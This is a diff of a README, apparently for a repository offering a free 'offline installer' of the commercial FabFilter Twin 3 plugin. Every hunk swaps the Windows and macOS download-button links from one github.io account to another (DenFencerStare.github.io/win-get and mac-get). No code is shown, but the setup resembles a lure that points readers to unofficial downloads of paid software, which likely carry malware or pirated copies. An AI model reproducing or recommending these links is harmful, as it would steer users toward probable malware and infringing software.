@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_FabFilter+Twin+3-E85B26?style=for-the-badge&logo=github)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download](https://img.shields.io/badge/⬇_Download_FabFilter+Twin+3-E85B26?style=for-the-badge&logo=github)](https://DenFencerStare.github.io/win-get/)
 
 </div>
 
@@ -58,9 +58,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
 
 </div>
 
@@ -106,7 +106,7 @@ This repository provides an **offline installer** for evaluation and educational
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_Now-E85B26?style=for-the-badge&logo=github)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download Now](https://img.shields.io/badge/⬇_Download_Now-E85B26?style=for-the-badge&logo=github)](https://DenFencerStare.github.io/win-get/)
 
 <img src="https://skillicons.dev/icons?i=windows,apple,github" />
 
